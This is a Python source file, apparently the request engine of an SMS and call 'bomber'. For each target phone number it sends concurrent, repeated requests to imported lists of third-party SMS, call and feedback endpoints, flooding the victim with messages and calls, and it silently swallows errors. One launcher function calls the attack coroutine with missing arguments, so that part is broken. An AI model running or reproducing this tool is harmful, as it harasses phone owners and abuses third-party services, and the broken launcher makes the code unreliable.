from asyncio import ensure_future, gather, run
from aiohttp import ClientSession

from Core.Attack.Services import urls
from Core.Attack.Feedback_Services import feedback_urls
from Core.Config import check_config



async def request(session, url, atype):
    try:
        type_attack = ('SMS', 'CALL', 'FEEDBACK') if atype == 'MIX' else atype

        if url['info']['attack'] in type_attack:
            async with session.request(url['method'], url['url'], params=url.get('params'), cookies=url.get('cookies'), headers=url.get('headers'), data=url.get('data'), json=url.get('json'), timeout=20) as response:
                return await response.text()
    except:
        pass



async def async_attacks(number, atype, feedback):
    async with ClientSession() as session:
        services = (urls(number) + feedback_urls(number)) if feedback == 'True' else urls(number)
        print(services)
        tasks = [ensure_future(request(session, service, atype)) for service in services]
        await gather(*tasks)



def start_async_attacks(number, replay):
    '''Запуск бомбера'''

    for _ in range(int(replay)):
        print(f"{_}/{replay}")
        run(async_attacks(number))


def start_async_attackvx(numbers, atype, feedback, repeats):
    for number in numbers:
        for _ in range(int(repeats)):
            run(async_attacks(number, atype, feedback))
